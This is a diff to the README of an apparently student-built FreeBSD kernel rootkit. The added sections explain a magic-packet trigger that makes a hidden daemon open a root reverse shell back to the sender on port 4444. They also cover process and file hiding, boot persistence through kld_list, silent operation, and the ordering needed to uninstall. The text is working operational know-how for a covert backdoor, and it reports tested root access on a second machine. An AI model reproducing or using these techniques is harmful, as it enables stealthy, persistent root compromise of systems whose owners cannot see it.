@@ -83,6 +83,14 @@
 
 
 
+# REMOTE
+- `./remote <TARGET_IP>` runs on `$REMOTE`, the machine with network access. it binds TCP `4444`, sends one UDP datagram containing `BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1` to `<TARGET_IP>:4444`, waits for the callback and then bridges your terminal to it
+- the target side is a kernel listener (`remote_listener_thread` in `kernel/rootkit.c`) plus the `revshell` daemon. the listener is a UDP socket created with `socreate()`/`sobind()` and only wakes on that magic string; `revshell` sits in the `rootkit_WAIT_REMOTE` ioctl, which blocks on the `remote_cv` condition variable until a trigger arrives
+- when it does, `revshell` forks, the child elevates with `rootkit_ELEVATE`, connects back to the sender's address on TCP `4444`, redirects stdin/stdout/stderr to the socket and execs `/bin/sh -i`. `hide_process_syscall()` is called first, so the shell does not appear in `ps` or `sysctl kern.proc`
+- the sender address the kernel recorded is used as-is; if the trigger appears to come from `0.0.0.0` (a host-side forwarder that rewrote it) the compile-time `DEFAULT_REMOTE_IP` is used instead
+- two orderings decide whether this works on a fresh box, and both were found the hard way. `revshell` waits up to two minutes for `/dev/rootkit` to appear instead of exiting on the first `ENOENT`, and `install` starts it *after* `kldload`. the device exists only once `MOD_LOAD` has run, so a daemon started earlier was gone before it could wait for anything, and `./remote` waited until its timeout for a callback that could never come
+- measured end to end with `$REMOTE` on a different machine: `./remote` printed the callback banner, and `id`, `hostname`, `uname -r` typed into it came back as `uid=0(root) gid=0(wheel) groups=0(wheel)`, `freebsd`, `14.5-RELEASE`, exit status 0. under QEMU the datagram needs `hostfwd=udp:127.0.0.1:4444-:4444`; in the assignment's two-machine setup no forwarding is involved at all
+
 # PERSISTENCE
 - persistence is implemented by using freebsd's kernel module kld_list functionality
 - kld_list adds the rootkit module to its list of modules loaded upon startup
@@ -96,6 +104,8 @@
 - `./uninstall` reverses `./install`, and the order is the whole point: **turn hiding off, unload, then delete**
 - while the module is live, `modfind`, `fstatat`, `getdirentries`, `open` and `access` all cooperate to make the module and every path containing "rootkit" or "hide" disappear. a script that stats or deletes anything before unloading concludes that nothing was ever installed -- `[ -e /boot/modules/rootkit.ko ]` is false, `/etc/rc.conf` cannot be opened, and `kldunload rootkit` answers "no such module"
 - step 1 sends the empty module name to `sys/kld_hiding` with `/usr/local/bin/hide_kld -u`, which turns the syscall filters off without touching the kernel lists. `hide_kld` is installed into `/usr/local/bin` because the in-tree copy lives under a path that is itself hidden. if the helper cannot be exec'd (module not registered), the script falls back to `dd`-ing `user/hide_kld.c` out of the hidden tree, compiling it in `/tmp` and running that copy -- `open()` is not filtered, only `stat()` is, so `dd` still reads the source
+- step 0 (before the unload, not after) stops `rklog` and `revshell` and waits for them to actually exit. both hold `/dev/rootkit` open, and `destroy_dev()` inside `MOD_UNLOAD` blocks until the last reference is dropped -- an unload waiting there keeps the linker lock, so `kldstat` and every later `kldunload` in the system hang behind it. measured: unloading by hand with a revshell alive wedged the box until reboot
+- run the script by path (`/path/to/uninstall`), not by `cd`-ing into the directory first: the directory name contains "rootkit", so the `cd` fails while the module is loaded. `execve()` on an absolute path is not filtered
 - step 2 is `kldunload rootkit`, retried as `kldunload -n rootkit`. both failing aborts with "nothing was deleted" rather than deleting half of it
 - step 3 removes `/boot/modules/rootkit.ko`, `rklog`, `revshell`, `elevate` and `hide_kld`, the `kld_list` entry and the `/etc/rc.local` lines. verified: rc 0, and afterwards `/dev/rootkit` is gone, `kldstat` lists only the stock modules, and `dmesg` says nothing about any of this
 
